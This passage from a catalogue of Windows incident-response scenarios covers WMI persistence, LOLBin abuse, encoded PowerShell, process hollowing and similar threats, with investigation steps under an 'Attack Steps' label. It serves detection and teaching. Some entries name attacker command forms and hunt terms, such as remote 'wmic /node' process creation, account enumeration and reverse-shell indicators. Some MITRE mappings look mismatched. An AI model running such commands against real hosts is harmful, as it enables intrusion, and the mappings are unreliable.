- **Attack Steps**: 1. Open WMI Explorer and navigate to root\subscription. 2. Look for suspicious EventFilter, EventConsumer, and FilterToConsumerBinding. 3. Cross-reference suspicious filters with scheduled times or triggers (e.g., logon or process start). 4. Dump the full class contents to understand what scripts or commands are being executed. 5. Use wmic or powershell to query WMI subscriptions (Get-WmiObject -Namespace root\subscription -Class __EventFilter). 6. Correlate any encoded commands or script blocks. 7. Use Autoruns to look for corresponding WMI-based autoruns entries. 8. Track associated processes or registry modifications from these scripts. 9. Review event logs for execution triggers. 10. Remove malicious subscriptions and document forensics report.
- **Detection**: WMI event logging, script monitoring
- **Solution**: Remove malicious WMI entries, EDR alerts for WMI abuse
- **Tags**: WMI, Persistence, EDR, Scripting

## Detecting LOLBins Abuse via Unusual Command-Line Args

- **Attack Type**: Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: Living-off-the-land abuse
- **MITRE**: T1218
- **Impact**: Stealthy execution of malicious code
- **Tools**: Sysmon, Sigma Rules, Elastic SIEM
- **Scenario**: Attackers use legitimate binaries (like regsvr32, mshta) for malicious actions
- **Attack Steps**: 1. Enable Sysmon Event ID 1 (Process creation). 2. Search for LOLBins like regsvr32.exe, mshta.exe, rundll32.exe. 3. Examine command-line parameters — flag suspicious ones like remote script loading or unusual DLLs. 4. Create Sigma detection rules for these behaviors. 5. Correlate parent process (Office apps, user processes) spawning LOLBins. 6. Use Elastic SIEM to create alerts based on this behavior. 7. Extract execution timestamps and map to user logins. 8. Investigate dropped payloads and file locations. 9. Tag detected behavior and verify with threat intel feeds. 10. Build detection dashboards for ongoing monitoring.
- **Detection**: LOLBin command line matching, parent-child process chain
- **Solution**: Block suspicious command lines, user behavior analytics
- **Tags**: LOLBins, Sigma, SIEM, Threat Detection

## Analyzing Encoded PowerShell Commands

- **Attack Type**: Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: PowerShell obfuscation
- **MITRE**: T1059.001
- **Impact**: Bypass of AV and EDR
- **Tools**: PowerShell Logs, Event Logs, CyberChef
- **Scenario**: Obfuscated PowerShell commands are used to bypass detection
- **Attack Steps**: 1. Review Windows Event Logs for Event ID 4104 (PowerShell script block logging). 2. Search for “-enc” or “-EncodedCommand” in command lines. 3. Extract the Base64 strings from the command. 4. Paste the Base64 content into CyberChef and decode using Base64 → UTF-16 → Text. 5. Analyze decoded content for indicators (Invoke-WebRequest, meterpreter, reverse shell). 6. Map the decoded script to known attack patterns or modules. 7. Review script behavior (downloading files, disabling AV, creating scheduled tasks). 8. Match with process creation logs (Event ID 4688, Sysmon ID 1). 9. Check user accounts involved and system locations affected. 10. Flag as obfuscated attack and update detection rules.
- **Detection**: Script block logging, Base64 detection
- **Solution**: Enable PowerShell logging, decode on detection
- **Tags**: PowerShell, Obfuscation, CyberChef

## Finding Hidden Child Processes Using Process Trees

- **Attack Type**: Process Inspection
- **Target**: Workstation
- **Vulnerability**: Hidden process tree manipulation
- **MITRE**: T1057
- **Impact**: Execution evasion, lateral movement
- **Tools**: Process Explorer, Volatility, LogonTracer
- **Scenario**: Malware may spawn hidden child processes not visible in Task Manager
- **Attack Steps**: 1. Capture memory dump or inspect live system. 2. Load dump in Volatility and use pstree to map full process tree. 3. Identify hidden children of benign-looking parents (e.g., explorer.exe spawning cmd.exe). 4. Compare with live tools like Process Explorer to highlight inconsistencies. 5. Check token privileges and integrity levels of child processes. 6. Use cmdline plugin to review hidden command lines. 7. Extract timestamp correlation with user logon/logoff events. 8. Review logon sessions using LogonTracer. 9. Map persistence mechanism if linked to registry or scheduled tasks. 10. Document anomalies for case report.
- **Detection**: Process tree visualization, logon event correlation
- **Solution**: Improve process tree monitoring, audit logs
- **Tags**: Volatility, Token Abuse, Process Trees

## Investigating Command Execution via Services.exe

- **Attack Type**: Process Inspection
- **Target**: Server
- **Vulnerability**: Service hijack abuse
- **MITRE**: T1569.002
- **Impact**: Persistent malware execution
- **Tools**: Event Viewer, Volatility, Autoruns
- **Scenario**: Attackers hijack or abuse Services.exe to spawn malicious code
- **Attack Steps**: 1. Review running services in Task Manager and services.msc. 2. Identify any unusual or recently added services. 3. Use Autoruns to detect new service entries with unfamiliar names. 4. Capture memory and analyze with Volatility using svcscan and cmdline. 5. Look for services with strange paths or DLLs being loaded. 6. Map parent-child from services.exe to determine whether malware was injected. 7. Check registry paths for service startup persistence. 8. Compare creation time of service with known infection window. 9. Review corresponding logs (Event ID 7045) for new service installations. 10. Remove rogue services and document evidence.
- **Detection**: Service creation logs, memory and registry analysis
- **Solution**: Use service whitelisting, detect service misconfigurations
- **Tags**: Services.exe, Registry, Service Abuse

## Locating Scripting Attacks via Prefetch Analysis

- **Attack Type**: Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: Prefetch-based behavior detection
- **MITRE**: T1047
- **Impact**: Unlogged execution detection
- **Tools**: WinPrefetchView, KAPE, PEcmd
- **Scenario**: Prefetch reveals script or command activity missed by live logging
- **Attack Steps**: 1. Collect prefetch files from C:\Windows\Prefetch. 2. Load files into WinPrefetchView or parse using PEcmd. 3. Look for execution entries like powershell.exe, wscript.exe, cmd.exe. 4. Review last execution time and frequency — frequent use indicates automation. 5. Identify anomalies like command-line tools run by unusual users. 6. Cross-reference timestamps with known malicious activity. 7. Extract associated DLLs and executables. 8. Correlate with event logs and registry for additional context. 9. Highlight suspicious scripting behaviors (like dropped files). 10. Archive parsed report and map into investigation timeline.
- **Detection**: Prefetch analysis, tool correlation
- **Solution**: Enable prefetch parsing in triage workflows
- **Tags**: Prefetch, KAPE, PEcmd

## Detecting CMD-based Recon Activity

- **Attack Type**: Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: Reconnaissance via native tools
- **MITRE**: T1057
- **Impact**: Initial access mapping
- **Tools**: Sysmon, Elastic SIEM
- **Scenario**: Attackers often perform recon using cmd.exe and netstat, ipconfig, whoami
- **Attack Steps**: 1. Search Sysmon Event ID 1 logs for cmd.exe. 2. Extract command lines and look for recon commands (whoami, systeminfo, netstat, ipconfig). 3. Review user context under which cmd was run. 4. Check for elevated privileges. 5. Correlate execution with time-of-day anomalies. 6. Group recon commands together by time window. 7. Map recon stages against kill chain. 8. Identify suspicious directories or temp paths used. 9. Generate alerts using SIEM platform. 10. Document indicators and update detection rules.
- **Detection**: Command line monitoring and pattern detection
- **Solution**: Alert on suspicious recon commands
- **Tags**: Recon, cmd.exe, Kill Chain

## Uncovering Malicious Rundll32 Execution

- **Attack Type**: Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: DLL sideloading via rundll32
- **MITRE**: T1218.011
- **Impact**: Code execution bypassing AV
- **Tools**: Sysmon, Event Viewer, PE-sieve
- **Scenario**: rundll32 abused to execute malicious DLL payloads
- **Attack Steps**: 1. Search for process creation events involving rundll32.exe. 2. Examine command line — flag if it includes suspicious DLLs or URLs. 3. Use PE-sieve to inspect DLL in memory. 4. Compare with known good DLLs and signed binaries. 5. Review parent process — often Office, browsers, or scripting tools. 6. Correlate with network logs if DLL triggers outbound connections. 7. Match timestamps with known attack stages. 8. Monitor persistence via registry or scheduled tasks. 9. Analyze associated file artifacts and paths. 10. Isolate and investigate DLL, add signature to blocklists.
- **Detection**: Command line parsing, memory scanning
- **Solution**: Block DLL execution paths, use AppLocker
- **Tags**: rundll32, DLL, Execution

## Detecting Suspicious PowerShell Spawned by Office

- **Attack Type**: Process Tree Analysis
- **Target**: Workstation
- **Vulnerability**: Office Macro Execution
- **MITRE**: T1059.001
- **Impact**: Code Execution, Lateral Movement
- **Tools**: Sysmon, Process Explorer, KAPE
- **Scenario**: An attacker uses a malicious Word doc to spawn PowerShell for lateral movement
- **Attack Steps**: 1. Open the target endpoint’s Sysmon logs collected via KAPE. 2. Look for Office applications (winword.exe, excel.exe) in process creation logs. 3. Identify any child process spawned from Office apps (e.g., powershell.exe). 4. Extract command-line arguments used by PowerShell to spot base64-encoded payloads. 5. Verify if PowerShell ran with unusual flags like -nop, -w hidden, -enc. 6. Correlate this with timestamped user activity or document open times. 7. Cross-check file hashes of the Word document from user temp folder. 8. Capture memory using Volatility and check for in-memory PowerShell scripts. 9. Check if this process spawned any network activity like C2 traffic. 10. Flag for investigation and isolate the machine for further triage.
- **Detection**: Sysmon Event ID 1 (Process Create), EDR process lineage
- **Solution**: Block macro execution, implement ASR rules
- **Tags**: PowerShell, Office Abuse, Macros

## Uncovering Process Hollowing in Suspicious svchost.exe

- **Attack Type**: Memory Forensics
- **Target**: Windows System
- **Vulnerability**: Process Hollowing
- **MITRE**: T1055.012
- **Impact**: Persistence, Evasion
- **Tools**: Volatility, PE-sieve, Process Hacker
- **Scenario**: A legitimate Windows process (svchost.exe) is hollowed and replaced with malicious code
- **Attack Steps**: 1. Capture live memory of the compromised host using DumpIt. 2. Load memory into Volatility and list running processes (pslist, pstree). 3. Identify suspicious svchost.exe instance with inconsistent parent process. 4. Use malfind plugin to locate injected memory regions in svchost.exe. 5. Dump the suspicious memory region and analyze with PE-sieve. 6. Check for discrepancies in PE headers or suspicious imports. 7. Use Process Hacker to inspect memory layout of svchost.exe in live analysis. 8. Check if the command-line arguments of svchost.exe match known benign patterns. 9. Flag the hollowed process, quarantine machine, and initiate full forensic triage. 10. Document hash values, timestamps, and injected code.
- **Detection**: Volatility malfind, Process Hacker memory map
- **Solution**: Prevent unknown processes from launching from temp folders
- **Tags**: Memory Injection, svchost abuse

## Tracing Script Block Logging of Malicious PowerShell

- **Attack Type**: Command-Line Analysis
- **Target**: Endpoint
- **Vulnerability**: Lack of Logging or Monitoring
- **MITRE**: T1059.001
- **Impact**: Remote Payload Delivery
- **Tools**: PowerShell Logs (Event ID 4104), Event Viewer
- **Scenario**: Attacker executes encoded PowerShell commands using shortcut (.lnk) file
- **Attack Steps**: 1. Navigate to Event Viewer → Applications and Services → Microsoft → Windows → PowerShell → Operational. 2. Look for Event ID 4104 entries indicating script block logging. 3. Search for large encoded command blocks (often base64). 4. Decode base64 strings to extract raw PowerShell code. 5. Analyze decoded scripts for indicators like Invoke-Expression, IEX, WebClient. 6. Correlate execution timestamp with prefetch records for powershell.exe. 7. Check user account context and whether the process chain links to suspicious shortcut files. 8. Validate file paths and hash the .lnk file for threat intel matching. 9. Isolate the endpoint if the script was found to download remote payloads. 10. Use KAPE to extract related timeline and registry artifacts.
- **Detection**: Event ID 4104 + Prefetch file correlation
- **Solution**: Enforce script block logging, apply AMSI integration
- **Tags**: PowerShell Abuse, Script Analysis

## Detecting WMIC-Based Lateral Movement

- **Attack Type**: WMI Abuse Detection
- **Target**: Internal Host
- **Vulnerability**: Credential Access + WMI Lateral
- **MITRE**: T1047
- **Impact**: Lateral Movement, Remote Code Execution
- **Tools**: Windows Event Logs, Sysmon, WinRM Logs
- **Scenario**: Attacker uses WMIC to execute remote commands via lateral movement
- **Attack Steps**: 1. Enable auditing for WMI-activity using GPO or Sysmon configuration. 2. Search for Event ID 5861 (WMI Activity) or Sysmon Event ID 1 with wmic.exe. 3. Filter for command-line patterns like wmic /node:<targetIP> process call create. 4. Check timestamps and originating user account context. 5. Review PowerShell or batch scripts that triggered WMIC command. 6. Examine any created processes on the remote system during the same timestamp. 7. Identify any anomalous inter-host process activity using Sysmon Event ID 3 (Network Connection). 8. Search registry Run keys for persistence attempts after WMIC use. 9. Use Plaso/Timesketch to reconstruct timeline around WMIC usage. 10. Tag affected systems for further forensic review and patch vulnerabilities.
- **Detection**: Event ID 5861, Sysmon ID 1/3
- **Solution**: Block remote WMI calls unless authorized, audit WMIC use
- **Tags**: WMI, Lateral Movement, Process Creation

## Identifying Process Doppelgänging in Malware Execution

- **Attack Type**: Process Injection
- **Target**: Windows Workstation
- **Vulnerability**: Process Doppelgänging
- **MITRE**: T1055.013
- **Impact**: Fileless Malware Execution
- **Tools**: Volatility, Rekall, YARA
- **Scenario**: Advanced malware uses doppelgänging to run without touching disk
- **Attack Steps**: 1. Capture system RAM using WinPMEM or Belkasoft Live RAM Capturer. 2. Load dump into Volatility and use psxview to find discrepancies between process listings. 3. Run malfind to find injected code into memory sections. 4. Correlate with ldrmodules to see if mapped DLLs are not backed by disk. 5. Compare loaded module path and memory section information. 6. Look for non-existent image path or missing PE header. 7. Create custom YARA rules to match memory-resident PE files. 8. Extract dumped memory regions for malware analysis in sandbox. 9. Determine parent process and assess if it's an exploited legitimate binary. 10. Document and isolate the system, alert SOC for containment.
- **Detection**: Volatility psxview, ldrmodules, YARA
- **Solution**: Monitor process mapping inconsistencies
- **Tags**: Fileless, Memory Resident, Evasion

## Inspecting Rundll32 Abuse for Execution

- **Attack Type**: Living-off-the-Land Binaries (LOLBins)
- **Target**: Windows
- **Vulnerability**: LOLBin Abuse
- **MITRE**: T1218.011
- **Impact**: Defense Evasion, Execution
- **Tools**: Sysmon, Event Logs, Autoruns
- **Scenario**: Rundll32 is used to execute malicious scriptlets or DLLs from command line
- **Attack Steps**: 1. Review Sysmon Event ID 1 logs for instances of rundll32.exe. 2. Extract full command line to identify if it's executing from user folders or temp. 3. Spot suspicious DLLs or scriptlet URLs in arguments. 4. Check for base64-encoded payloads using rundll32 javascript: or mshtml. 5. Validate DLL signatures and check against known malware hashes. 6. Use Autoruns to see if rundll32 was used for persistence. 7. Trace parent process and see if rundll32 was launched by a script or macro. 8. Cross-reference with registry and user startup entries. 9. Quarantine associated DLL or script for further sandbox analysis. 10. Block rundll32-based payload paths via AppLocker or equivalent.
- **Detection**: Sysmon Event ID 1, Autoruns analysis
- **Solution**: Limit rundll32 execution to signed DLLs
- **Tags**: Rundll32, LOLBAS, AppLocker

## Analyzing Registry-Based WMI Persistence

- **Attack Type**: Registry Forensics
- **Target**: Windows Registry
- **Vulnerability**: WMI Persistence via Registry
- **MITRE**: T1084
- **Impact**: Persistence Mechanism
- **Tools**: RegRipper, Event Logs, Autoruns
- **Scenario**: Attacker uses WMI Event Subscription stored in registry for persistence
- **Attack Steps**: 1. Use RegRipper to extract registry keys: HKEY_LOCAL_MACHINE\Software\Microsoft\Wbem\. 2. Look for __EventFilter, __EventConsumer, and __FilterToConsumerBinding. 3. Extract the names and scripts associated with each consumer. 4. Identify suspicious PowerShell or VBScript payloads inside consumer script. 5. Review timestamp and user SID that created the entries. 6. Validate with Autoruns if WMI persistence is active. 7. Check for matching Event ID 5861 in logs for WMI activity. 8. Compare script hash against known malware samples. 9. Remove rogue WMI entries and back up evidence. 10. Harden registry permissions and disable unnecessary WMI components.
- **Detection**: RegRipper keys, WMI Logs
- **Solution**: Remove rogue WMI subscriptions, lock WMI registry
- **Tags**: WMI, Registry, Persistence

## Decoding Scheduled Task Execution via cmd.exe

- **Attack Type**: Command Line Artifact
- **Target**: Windows
- **Vulnerability**: Scheduled Task Abuse
- **MITRE**: T1053.005
- **Impact**: Persistence, Evasion
- **Tools**: Prefetch, Event Logs, Task Scheduler XML
- **Scenario**: Malware uses schtasks to execute payloads via cmd
- **Attack Steps**: 1. Use KAPE or FTK Imager to pull prefetch files and registry. 2. Locate cmd.exe prefetch entries and identify unusual command lines. 3. Search Event ID 4698 for scheduled task creation. 4. Extract task name and associated script or executable. 5. Cross-reference C:\Windows\System32\Tasks\ for XML files. 6. Identify payload file and time of execution. 7. Examine who created the task and if it aligns with normal user behavior. 8. Detect if task hides behind legitimate-sounding names. 9. Review registry under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache. 10. Disable task, quarantine payload, and audit task scheduler access.
- **Detection**: Prefetch + Event ID 4698 + Registry
- **Solution**: Disable unauthorized scheduled tasks
- **Tags**: Scheduled Tasks, cmd abuse

## Discovering Suspicious Child Processes of Services.exe

- **Attack Type**: Process Relationship
- **Target**: Server
- **Vulnerability**: Services Misuse
- **MITRE**: T1543.003
- **Impact**: Persistence, Execution
- **Tools**: Sysmon, KAPE, Process Hacker
- **Scenario**: Malware spawns cmd or PowerShell from services.exe to hide
- **Attack Steps**: 1. Collect process creation logs from endpoint using KAPE. 2. Look for services.exe spawning processes like cmd.exe, powershell.exe. 3. Validate the service associated using Service Control Manager logs. 4. Examine command line for encoded or remote scripts. 5. Check time correlation with known alerts or login anomalies. 6. Determine whether it matches known service startup activity. 7. Trace child process chain and memory contents. 8. Review installed services and startup types. 9. Document the executable hash and compare to threat intel. 10. Kill rogue services and delete the underlying binary if unauthorized.
- **Detection**: Sysmon + SCM Logs
- **Solution**: Audit services for unusual child process spawning
- **Tags**: services.exe, cmd, privilege abuse

## Extracting Tradecraft from Obfuscated Batch Files

- **Attack Type**: Command Line Analysis
- **Target**: Workstation
- **Vulnerability**: Batch Script Obfuscation
- **MITRE**: T1059.003
- **Impact**: Initial Access, Payload Delivery
- **Tools**: FTK Imager, CyberChef, Notepad++
- **Scenario**: Attacker drops obfuscated .bat script that downloads payload
- **Attack Steps**: 1. Locate .bat file using FTK Imager from Downloads, Temp, or AppData. 2. Open script in Notepad++ to observe structure. 3. Identify heavy use of ^, &, :: to break static signatures. 4. Use CyberChef to clean and decode layered obfuscation. 5. Extract URL or IP address used for downloading malicious payload. 6. Look for persistence logic like copying itself to startup folder. 7. Cross-reference timestamps with process creation logs. 8. Check Windows Defender logs for detection attempt. 9. Analyze payload via sandbox or static methods. 10. Block associated indicators and improve script detection rules.
- **Detection**: File Analysis + Process Correlation
- **Solution**: Update batch script detection, improve static signatures
- **Tags**: Obfuscation, Batch File, Payload

## Investigating Rundll32 Abuse for Payload Execution

- **Attack Type**: Process Analysis
- **Target**: Workstation
- **Vulnerability**: LOLBin abuse
- **MITRE**: T1218.011
- **Impact**: Stealthy execution
- **Tools**: Volatility, Process Hacker
- **Scenario**: Rundll32 is often abused to execute malicious DLLs in stealthy ways. This scenario examines such an attack.
- **Attack Steps**: 1. Boot the compromised system and prepare volatile memory capture using DumpIt. 2. Load the memory dump into Volatility and use pslist or psscan to identify active processes. 3. Search for rundll32.exe instances and note parent-child relationships. 4. Investigate command-line arguments associated with each rundll32.exe instance for signs of DLL execution from unusual directories. 5. Use dlllist and ldrmodules to confirm if suspicious DLLs are loaded. 6. Use Process Hacker to check the file path and integrity of the loaded DLL. 7. Compare DLL hash against known malicious signatures using VirusTotal. 8. Trace if the DLL is sideloaded or masqueraded. 9. Log findings and export memory region for deeper analysis. 10. Tag this behavior in timeline and generate alert rules.
- **Detection**: Monitor command line args and DLL paths in rundll32
- **Solution**: Block unsigned DLLs from user folders; monitor for LOLBin misuse
- **Tags**: rundll32, DLL injection, volatility, process analysis

## Detecting Encoded PowerShell via Command Line

- **Attack Type**: Command Line Analysis
- **Target**: Windows Workstation
- **Vulnerability**: Obfuscated Scripting
- **MITRE**: T1059.001
- **Impact**: Fileless payloads
- **Tools**: Event Log Explorer, Sigma, Windows Logs
- **Scenario**: Threat actors use base64-encoded PowerShell to hide malicious payloads. This scenario identifies such cases from logs.
- **Attack Steps**: 1. Access Windows Event Viewer on compromised host or exported EVTX logs. 2. Filter for Event ID 4104 (PowerShell script block logging) and 4688 (process creation). 3. Parse command line fields and identify those containing -EncodedCommand. 4. Extract the base64 strings and decode them using PowerShell or CyberChef. 5. Review decoded content for known attack patterns (e.g., downloading payload, creating new users). 6. Correlate with execution time and user account context. 7. Tag unusual times or admin-initiated execution as suspicious. 8. Use Sigma rules to automate detection for encoded payloads. 9. Generate alerts for analysts and link back to source process. 10. Recommend enabling full command-line logging and script block logging if not already on.
- **Detection**: Script block and command-line logging
- **Solution**: Decode and analyze all -EncodedCommand uses
- **Tags**: powershell, obfuscation, command line

## Parent-Child Mismatch: winword.exe spawning powershell.exe

- **Attack Type**: Process Relationship
- **Target**: Office Endpoint
- **Vulnerability**: Macro Execution
- **MITRE**: T1203
- **Impact**: Initial Access via Office
- **Tools**: Sysmon, KAPE, Process Explorer
- **Scenario**: Attackers often embed macros in Office documents which launch PowerShell. This scenario traces such behavior.
- **Attack Steps**: 1. Collect event logs using KAPE or directly access Sysmon logs (Event ID 1). 2. Search for process trees where WINWORD.exe is the parent of powershell.exe. 3. Analyze command-line arguments passed to PowerShell. 4. Flag behaviors like downloading files, disabling security features, or encoding. 5. Check time correlation between Word document opening and PowerShell execution. 6. Use Process Explorer or Volatility to inspect the process memory and verify payloads. 7. Export memory segment or dump from PowerShell process for static analysis. 8. Determine if macro auto-runs using Autoruns tool. 9. Document findings and extract IOC (IP, domains, file hashes). 10. Create timeline mapping for internal reporting and response.
- **Detection**: Parent-child analysis (Sysmon Event ID 1)
- **Solution**: Disable macros by default; alert on suspicious parent-child chains
- **Tags**: office_macro, process_tree, kape

## WMI-based Backdoor via Event Consumer

- **Attack Type**: Command Line & WMI
- **Target**: Windows System
- **Vulnerability**: WMI Persistence
- **MITRE**: T1047
- **Impact**: Stealthy Persistence
- **Tools**: WMI Explorer, Event Viewer, Autoruns
- **Scenario**: Some attackers use WMI Event Consumers to persist or re-execute commands stealthily.
- **Attack Steps**: 1. Launch WMI Explorer and navigate to the __EventConsumer and __FilterToConsumerBinding classes. 2. List all filters and consumers configured on the system. 3. Identify suspicious triggers (e.g., timer-based or process-based). 4. Examine associated commands — especially PowerShell or command prompt. 5. Correlate timestamps of creation with known breach times. 6. Check persistence using Autoruns under the WMI tab. 7. Dump WMI repository if necessary for offline analysis. 8. Validate commands and file paths used — check integrity. 9. Remove unauthorized WMI event bindings. 10. Add detection logic for future WMI filter abuse.
- **Detection**: Monitor WMI filters and consumers
- **Solution**: Alert on new consumers and use baselining
- **Tags**: wmi, persistence, dfir

## Unusual CMD.EXE Usage from Non-Admin Tools

- **Attack Type**: Command Line Analysis
- **Target**: Windows Workstation
- **Vulnerability**: Unusual Process Trees
- **MITRE**: T1059
- **Impact**: Possible Privilege Escalation
- **Tools**: Sysmon, Event Logs, Sigma
- **Scenario**: Command prompt launched from user-level tools like Notepad may indicate lateral movement or privilege escalation attempts.
- **Attack Steps**: 1. Extract process creation logs using Event ID 4688 from Windows logs or Sysmon. 2. Filter logs for instances where cmd.exe was launched by unexpected parents (e.g., Notepad, Calculator). 3. Correlate the timing and user session data. 4. Analyze command line arguments for privilege-related operations. 5. Check if script execution or user creation was involved. 6. Compare with baseline behavior of legitimate use. 7. If suspicious, capture process memory for further analysis. 8. Create detection logic using Sigma to flag anomalous parent-child combos. 9. Use KAPE to extract additional forensic artifacts. 10. Report pattern for SOC playbook enrichment.
- **Detection**: Analyze Event ID 4688 + Sigma
- **Solution**: Train detection on parent anomalies
- **Tags**: cmd abuse, parent anomaly, sigma

## WMIC for Credential Harvesting

- **Attack Type**: WMI Abuse
- **Target**: Windows Server
- **Vulnerability**: Abused System Tools
- **MITRE**: T1047
- **Impact**: Recon + Credential Enumeration
- **Tools**: KAPE, Event Logs, Volatility
- **Scenario**: WMIC used for extracting system credentials and lateral enumeration.
- **Attack Steps**: 1. Use KAPE to extract Windows Event Logs and Prefetch artifacts. 2. Search for wmic.exe invocations in logs and prefetch data. 3. Focus on commands like wmic ntdomain, useraccount get name,sid, etc. 4. Correlate timing with lateral movement or initial access phase. 5. Use Volatility to inspect process memory for loaded tokens. 6. Extract memory dump of the WMIC process to review any harvested data. 7. Confirm if WMIC was used with elevated privileges. 8. Monitor Security.evtx for user logon attempts during same time. 9. Use Sigma rule to catch wmic access from user folders or unusual times. 10. Mitigate by blocking wmic or auditing WMI usage closely.
- **Detection**: WMI logs, Prefetch, Event ID 4688
- **Solution**: Block legacy WMI commands; monitor WMIC frequency
- **Tags**: wmic, recon, credential hunting

## Registry-Based Command Execution via Run Keys

- **Attack Type**: Command Line Persistence
- **Target**: Windows Endpoint
- **Vulnerability**: Registry Abuse
- **MITRE**: T1547.001
- **Impact**: Persistence After Reboot
- **Tools**: RegRipper, FTK Imager, Autoruns
- **Scenario**: Malicious commands often persist through registry Run keys. This entry investigates such abuse.
- **Attack Steps**: 1. Create a disk image using FTK Imager. 2. Load image into RegRipper and extract user and system Run keys. 3. Parse commands and verify file locations, arguments, and signatures. 4. Cross-reference creation time of the keys with incident timeline. 5. Check for Base64 or obfuscated PowerShell in command field. 6. Use Autoruns to verify startup entries and user context. 7. Correlate with Event ID 4688 to see actual execution records. 8. Extract file referenced in command and check hash. 9. Remove malicious keys and document changes. 10. Apply group policy to limit registry-based persistence.
- **Detection**: Audit Run keys via RegRipper
- **Solution**: Harden registry usage; alert on changes
- **Tags**: registry, autoruns, startup abuse

## Suspicious Use of MSHTA to Execute Scripts

- **Attack Type**: Command Line Analysis
- **Target**: Windows System
- **Vulnerability**: LOLBin Abuse
- **MITRE**: T1218.005
- **Impact**: Fileless Script Execution
- **Tools**: Event Logs, Process Explorer
- **Scenario**: mshta.exe is used by attackers to execute HTML-based scripts, often fileless.
- **Attack Steps**: 1. Monitor process creation logs (4688) or use Sysmon. 2. Identify mshta.exe launched from non-browser locations. 3. Examine the command line for references to remote URLs or embedded scripts. 4. Use Process Explorer to analyze the memory and open handles of mshta. 5. Capture network activity to check if script connects to C2. 6. Cross-check hash of any downloaded payload. 7. Create detection rule for mshta + URL combo. 8. Educate users about clicking suspicious HTA files. 9. Add mshta blocking rule via AppLocker or SRP. 10. Correlate behavior with phishing campaigns.
- **Detection**: Analyze mshta command lines
- **Solution**: Block mshta; alert on unusual usage
- **Tags**: mshta, script abuse, fileless

## Persistence via Services Set to Restart

- **Attack Type**: Process Monitoring
- **Target**: Server
- **Vulnerability**: Service Abuse
- **MITRE**: T1543.003
- **Impact**: High Persistence
- **Tools**: Autoruns, Services.msc, FTK Imager
- **Scenario**: Malware may register itself as a service that restarts if terminated.
- **Attack Steps**: 1. Extract registry hive or inspect live system with Autoruns. 2. Identify suspicious services under HKLM\SYSTEM\CurrentControlSet\Services. 3. Analyze associated executable path and service description. 4. Look for parameters like RestartService or failure recovery set to restart. 5. Dump binary from disk and analyze signature. 6. Check hash on VirusTotal. 7. Disable suspicious services and monitor system behavior. 8. Create rules to flag non-default services with recovery options. 9. Educate SOC analysts on common abuse patterns. 10. Document and track changes via change management.
- **Detection**: Service config and registry audit
- **Solution**: Lockdown service creation
- **Tags**: persistence, services, restart abuse

## Hidden PowerShell in Event Logs via 4104

- **Attack Type**: Command Line Forensics
- **Target**: Windows Host
- **Vulnerability**: Script Logging
- **MITRE**: T1059.001
- **Impact**: Script Tracing
- **Tools**: Event Viewer, PowerShell Logs
- **Scenario**: Detecting stealthy PowerShell activity logged in event ID 4104.
- **Attack Steps**: 1. Open Event Viewer and navigate to “Applications and Services Logs > Microsoft > Windows > PowerShell > Operational”. 2. Enable script block logging if not already active. 3. Filter for Event ID 4104 entries. 4. Extract and decode command blocks. 5. Search for IOCs or suspicious script logic. 6. Correlate timestamp with other attacker activity. 7. Validate if script triggered actual impact or was recon. 8. Tag behavior in timeline. 9. Write Sigma rule based on script content. 10. Document PowerShell logging as a defense mechanism.
- **Detection**: PowerShell 4104 log
- **Solution**: Enable and review script logging
- **Tags**: powershell, 4104, dfir

## PowerShell Obfuscation Analysis

- **Attack Type**: Command Line Analysis
- **Target**: Windows Endpoint
- **Vulnerability**: Lack of PowerShell auditing
- **MITRE**: T1059.001
- **Impact**: Stealthy malware execution
- **Tools**: Event Viewer, PowerShell logs, KAPE, CyberChef
- **Scenario**: Obfuscated PowerShell commands are used to bypass traditional detection and launch payloads
- **Attack Steps**: 1. Begin by identifying systems suspected of being compromised. 2. Use KAPE or Event Viewer to extract PowerShell Operational logs (Microsoft-Windows-PowerShell/Operational). 3. Look for suspiciously long command lines, especially with -EncodedCommand. 4. Copy the Base64-encoded string and decode it using CyberChef or a local script. 5. Analyze the decoded command for signs of malware delivery (e.g., download cradle, malicious script). 6. Investigate the parent process to confirm it aligns with expected behavior (e.g., explorer.exe vs winword.exe). 7. Trace network activity if URLs/IPs are embedded. 8. Correlate timestamps with other suspicious activity. 9. Flag or isolate any files downloaded through the command. 10. Document the IOC and begin threat hunting across the enterprise.
- **Detection**: PowerShell Script Block Logging, Base64 detection in command lines
- **Solution**: Enforce Constrained Language Mode, enable deep logging
- **Tags**: powershell, obfuscation, base64, detection

## WMI Persistence Analysis

- **Attack Type**: Command Line & WMI Analysis
- **Target**: Windows
- **Vulnerability**: Unmonitored WMI namespaces
- **MITRE**: T1084
- **Impact**: Long-term stealth persistence
- **Tools**: Autoruns, WMI Explorer, WinEventViewer
- **Scenario**: Attacker uses WMI for persistence, triggering payloads through WMI Event Consumers
- **Attack Steps**: 1. Access the target system or acquired disk image. 2. Use WMI Explorer or built-in wmic to enumerate __EventFilter, __EventConsumer, and __FilterToConsumerBinding. 3. Review WMI Event Filters for unusual triggers (e.g., timers, system startup). 4. Identify what command or script the Event Consumer is executing. 5. Extract and decode any obfuscated commands. 6. Trace the creation time and user SID associated with the WMI entry. 7. Search the system event logs to correlate the WMI event with activity (e.g., process creation). 8. Disable or remove suspicious WMI objects using wmic or PowerShell. 9. Document persistence mechanism and share with SOC. 10. Build a Yara rule or detection logic based on this persistence method.
- **Detection**: WMI object enumeration, 4688 logs
- **Solution**: Lock down WMI namespaces, audit consumer events
- **Tags**: wmi, persistence, event consumer, win32

## Rundll32 Abnormal Usage Detection

- **Attack Type**: Command Line Analysis
- **Target**: Windows
- **Vulnerability**: Living-off-the-land abuse
- **MITRE**: T1218.011
- **Impact**: Code execution under trusted process
- **Tools**: Sysmon, Event Logs, Process Hacker
- **Scenario**: rundll32.exe is abused to execute shellcode or scripts in memory
